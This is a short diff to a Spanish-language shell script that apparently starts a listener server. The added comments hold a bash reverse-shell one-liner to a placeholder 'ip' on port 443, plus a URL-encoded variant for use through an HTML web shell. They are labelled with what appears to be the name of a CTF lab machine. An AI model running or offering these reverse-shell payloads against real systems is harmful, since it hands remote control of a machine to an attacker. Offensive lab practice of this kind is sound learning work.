@@ -27,3 +27,11 @@ if [ "$response" = "s" ] || [ "$response" = "S" ] || [ -z "$response" ]; then
 else
     echo "Servidor no iniciado."
 fi
+
+
+
+#esto genera:
+#bash -i >& /dev/tcp/ip/443 0>&1
+
+#en algunos casos en shell html se modifica el & por %26
+#bash -c "bash -i >%26 /dev/tcp/ip/443 0>%261"  maquina bashed
